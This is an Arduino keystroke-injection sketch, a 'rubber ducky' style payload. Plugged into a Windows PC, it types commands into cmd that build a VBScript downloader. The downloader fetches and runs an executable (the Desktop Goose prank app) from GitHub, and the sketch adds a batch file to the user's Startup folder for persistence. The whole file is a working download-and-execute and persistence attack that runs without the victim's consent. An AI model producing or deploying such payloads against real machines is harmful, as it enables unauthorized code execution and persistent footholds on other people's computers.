#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  typeKey(KEY_ESC);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.print("cmd");

  delay(400);

  typeKey(KEY_ENTER);

  delay(400);

  Keyboard.print("cd C:\\");

  typeKey(KEY_ENTER);

  Keyboard.print("copy con download.vbs");

  typeKey(KEY_ENTER);

  Keyboard.print("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");

  typeKey(KEY_ENTER);

  Keyboard.print("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");

  typeKey(KEY_ENTER);

  Keyboard.print("If objXMLHTTP.Status = 200 Then");

  typeKey(KEY_ENTER);

  Keyboard.print("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open");

  typeKey(KEY_ENTER);

  Keyboard.print("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0");

  typeKey(KEY_ENTER);

  Keyboard.print("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a");

  typeKey(KEY_ENTER);

  Keyboard.print("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing");

  typeKey(KEY_ENTER);

  Keyboard.print("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");

  typeKey(KEY_ENTER);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  typeKey(KEY_ENTER);

  Keyboard.print("cscript download.vbs https://github.com/QuantumThings/goose-desktop-0.3-for-rubber-ducky/raw/e023a6db34a08a5fa453eba7e140059374db06db/DesktopGoose%20v0.3%20Extractor.exe");

  typeKey(KEY_ENTER);

  Keyboard.print("DesktopGoose%20v0.3%20Extractor.exe");

  typeKey(KEY_ENTER);

  delay(400);

  typeKey(KEY_ENTER);

  delay(400);

  Keyboard.print("cd DesktopGoose%20v0.3");

  typeKey(KEY_ENTER);

  Keyboard.print("copy con \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AutoGoose.bat\"");

  Keyboard.print("@echo off");

  typeKey(KEY_ENTER);

  Keyboard.print("START C:\\DesktopGoose%20v0.3\\GooseDesktop.exe");

  typeKey(KEY_ENTER);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  typeKey(KEY_ENTER);

  Keyboard.print("GooseDesktop.exe");

  typeKey(KEY_ENTER);

  Keyboard.print("exit");

  typeKey(KEY_ENTER);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}
